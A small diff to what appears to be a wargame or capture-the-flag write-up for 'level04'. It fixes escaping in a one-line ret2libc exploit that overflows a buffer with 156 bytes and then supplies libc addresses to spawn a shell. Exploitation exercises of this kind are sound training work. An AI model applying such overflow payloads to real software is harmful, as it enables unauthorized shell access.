@@ -32,4 +32,4 @@ offset is 156
 ## ret2libc
 
 We reuse the addresses found in level01
-(python -c 'print("A" \* 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level04
+(python -c 'print("A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level04
